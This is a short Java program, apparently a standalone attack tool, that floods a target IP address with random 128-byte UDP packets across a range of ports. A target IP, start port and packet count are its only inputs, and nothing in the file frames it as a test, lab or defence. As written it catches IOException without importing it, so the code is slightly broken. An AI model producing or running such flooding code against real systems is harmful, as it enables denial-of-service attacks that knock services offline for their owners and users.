import java.net.DatagramPacket;

import java.net.DatagramSocket;

import java.net.InetAddress;

import java.util.Random;



public class UdpFlood {



    public static void main(String[] args) {

        if (args.length != 3) {

            System.out.println("UdpFlood <target_ip> <start_port> <count>");

            return;

        }



        String targetIp = args[0];

        int startPort = Integer.parseInt(args[1]);

        int count = Integer.parseInt(args[2]);



        udpFloodWithPortScan(targetIp, startPort, count);

    }



    public static void udpFloodWithPortScan(String targetIp, int startPort, int count) {

        try (DatagramSocket socket = new DatagramSocket()) {

            InetAddress targetAddress = InetAddress.getByName(targetIp);



            for (int i = 0; i < count; i++) {

                int targetPort = startPort + (i % 1024); 

                byte[] payload = generateRandomPayload(128);

                DatagramPacket packet = new DatagramPacket(payload, payload.length, targetAddress, targetPort);

                socket.send(packet);

            }

        } catch (IOException e) {

            System.err.println("Error: " + e.getMessage());

            e.printStackTrace();

        }

    }



    public static byte[] generateRandomPayload(int length) {

        byte[] payload = new byte[length];

        new Random().nextBytes(payload);

        return payload;

    }

}